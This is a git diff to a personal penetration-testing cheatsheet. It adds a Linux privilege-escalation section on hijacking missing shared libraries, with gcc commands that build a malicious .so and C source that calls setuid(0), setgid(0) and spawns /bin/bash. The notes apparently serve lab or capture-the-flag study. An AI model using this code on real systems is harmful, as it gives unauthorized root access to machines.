@@ -1,5 +1,5 @@
 # My Notes / Cheatsheet
-### Last Updated: 27 Jan 2020
+### Last Updated: 09 Feb 2020
 Notes related to Vuln Assmnt/PenTesting 
 
 #### Approach for Compromising a box
@@ -31,7 +31,31 @@ Notes related to Vuln Assmnt/PenTesting
 > 1. Pspy ?
 > 1. Kernel or other exploits e.g. exploits for SUDO ?
 > 1. **Linpeas** or **LinEnum** or **Linux Exploit Suggester**
-> 1. **LD PreLoad Stuff** --> https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
+> 1. **LD PreLoad Stuff - Use 'ldd' command to see the dependent .so files** --> https://atom.hackstreetboys.ph/linux-privilege-escalation-environment-variables/
+
+
+#### PrivESC Methodology for Linux - ldd hijacking (if a binary has .so missing)
+> 1. gcc rootshell.c -o vulnlib.so -shared -Wall -fPIC -w
+> 1. gcc rootshell.c -o custom_function_name.so -shared -Wall -fPIC -w
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+int main(void)
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+
+or
+
+#include <stdio.h>
+#include <sys/types.h>
+#include <unistd.h>
+void custom_function_name() 
+{
+setuid(0); setgid(0); system("/bin/bash");
+}
+```
 
 #### PrivESC Methodology for Linux - /etc/passwd && /etc/shadow
 > 1. Check who owns -> ls -lart /etc/passwd && who owns ls -lart /etc/shadow. 
